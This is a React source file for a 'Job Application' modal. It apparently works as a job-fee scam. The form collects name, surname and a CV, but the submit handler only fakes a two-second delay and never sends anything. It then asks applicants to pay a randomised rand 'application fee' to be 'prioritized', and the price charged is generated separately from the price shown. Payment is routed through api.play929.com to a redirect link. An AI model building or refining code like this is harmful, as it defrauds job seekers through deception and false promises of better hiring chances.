import React, { useState } from 'react';
import axios from 'axios';
import './form.scss';

const Form = ({ isOpen, onClose }) => {
  const [formData, setFormData] = useState({
    textInput: '',
    fileInput: null,
    surnameInput: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPaymentInfo, setShowPaymentInfo] = useState(false);
  const [isPaymentProcessing, setIsPaymentProcessing] = useState(false); // Track payment processing state
  const url = 'https://api.play929.com';

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleFileChange = (e) => {
    setFormData((prevData) => ({
      ...prevData,
      fileInput: e.target.files[0],
    }));
  };

  const getRandomAmount = () => {
    return (Math.random() * (49.99 - 40.99) + 40.99).toFixed(2); // Generate random amount between 40.99 and 49.99
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);  // Start loading state

    // Simulate delay for 2 seconds (for loading effect)
    setTimeout(() => {
      setIsLoading(false);
      setShowPaymentInfo(true);  // Show payment info after 2 seconds
    }, 2000);
  };

  const handlePayment = () => {
    setIsPaymentProcessing(true); // Start payment processing

    const amount = getRandomAmount();  // Get the random payment amount

    // Make the axios request to process the payment
    axios
      .get(`${url}/api/payment/process?amount=${amount}`, {})
      .then((response) => {
        setIsPaymentProcessing(false); // End payment processing

        if (response.status === 200) {
          // Redirect to the payment page after successful response
          window.location.href = response.data.link;
        }
      })
      .catch((error) => {
        setIsPaymentProcessing(false); // End payment processing
        console.error("Payment processing error:", error.response?.data?.error || "Something went wrong!");
      });
  };

  if (!isOpen) return null;

  return (
    <div className="modal-overlay">
      <div className="modal-container">
        <button className="close-button" onClick={onClose}>
          &times;
        </button>
        <h2 className="modal-title">Job Application</h2>
        {!showPaymentInfo ? (
          <form className="form" onSubmit={handleSubmit}>
            <div className="form-group">
              <label htmlFor="textInput">Name</label>
              <input
                type="text"
                id="textInput"
                name="textInput"
                value={formData.textInput}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="surnameInput">Surname</label>
              <input
                type="text"
                id="surnameInput"
                name="surnameInput"
                value={formData.surnameInput}
                onChange={handleChange}
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="fileInput">Upload CV</label>
              <input
                type="file"
                id="fileInput"
                name="fileInput"
                onChange={handleFileChange}
                required
              />
            </div>
            <button type="submit" className="submit-button" disabled={isLoading}>
              {isLoading ? "Processing..." : "Continue"}
            </button>
          </form>
        ) : (
          <div className="payment-info">
            <p>
              Boost your chances of getting hired! Pay a R{getRandomAmount()} application fee to ensure your application is prioritized and reviewed for faster approval:
            </p>
            <button
              className="pay-now-button"
              onClick={handlePayment}
              disabled={isPaymentProcessing} // Disable the button during payment processing
            >
              {isPaymentProcessing ? "Processing Payment..." : "Pay Now"}
            </button>
            {isPaymentProcessing && (
              <div className="loading-spinner">
                <div className="spinner"></div> {/* Spinner element */}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default Form;
